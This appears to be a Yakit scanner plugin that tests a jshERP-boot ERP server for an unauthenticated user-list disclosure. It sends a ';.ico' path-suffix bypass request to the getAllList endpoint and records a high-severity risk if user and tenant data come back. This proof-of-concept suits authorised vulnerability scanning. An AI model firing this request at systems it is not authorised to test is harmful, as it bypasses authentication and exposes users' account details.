# port scan plugin
# from 虚拟尽头
yakit.AutoInitYakit()

handleCheck = func(addr){
    isTls = str.IsTLSServer(addr)
    packet = `GET /jshERP-boot/user/getAllList;.ico HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
`

    	rsp,req,_ = poc.HTTP(packet, 
    	poc.params({"target":addr}),
    	poc.https(isTls),
    	poc.redirectTimes(0),
    )
    // dump(rsp)
    	if len(rsp) > 0 {
        	if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`)&&str.MatchAllOfSubString(rsp, `username`)&&str.MatchAllOfSubString(rsp, `tenantId`)&&str.MatchAllOfSubString(rsp, `userList`)&&str.MatchAllOfSubString(rsp, `isystem`){

                    risk.NewRisk(
                        target, risk.severity("high"), 
                        risk.title(f"jshERP-boot 未授权信息漏洞"),
                        risk.type("信息泄露"),
                        risk.request(req),
                        risk.response(rsp),
                        risk.details({
                            "packet":string(packet),
                            "payload":"getAllList",
                            }
                        ),
                )

        }
    }
    return
}

target = cli.String("root_url")
ip, port, _ = str.ParseStringToHostPort(target)
addr = str.HostPort(ip, port)
handleCheck(addr)
